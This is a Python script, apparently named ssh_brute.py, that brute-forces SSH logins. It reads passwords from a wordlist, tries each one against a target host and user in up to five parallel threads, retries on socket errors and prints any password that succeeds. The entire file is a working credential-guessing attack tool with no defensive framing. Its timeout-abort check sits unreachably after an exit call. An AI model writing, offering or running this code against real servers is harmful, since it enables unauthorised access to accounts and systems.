from pexpect import pxssh
import argparse
import time
import threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)

Found = False
Fails = 0


def connect(host, user, password, release=True):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = argparse.ArgumentParser(
        usage='python3 ssh_brute.py TARGET_HOST -u USERNAME -f PASSWD_FILE')
    parser.add_argument('tgt_host', type=str, metavar='TARGET_HOST',
                        help="specify target host's IP address")
    parser.add_argument('-u', type=str, metavar='USERNAME', required=True,
                        help='specify the user name')
    parser.add_argument('-f', type=str, metavar='PASSWD_FILE', required=True,
                        help='specify password file name')

    args = parser.parse_args()
    host = args.tgt_host
    passwd_file = args.f
    user = args.u

    with open(passwd_file) as file:
        for line in file.readlines():
            if Found:
                print("[*] Exiting: Password Found")
                exit(0)
                if Fails > 5:
                    print("[!] Exiting: Too Many Socket Timeouts")
                    exit(0)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print("[-] Testing: " + str(password))
            t = threading.Thread(target=connect,
                                 args=(host, user, password))
            t.start()


if __name__ == '__main__':
    main()
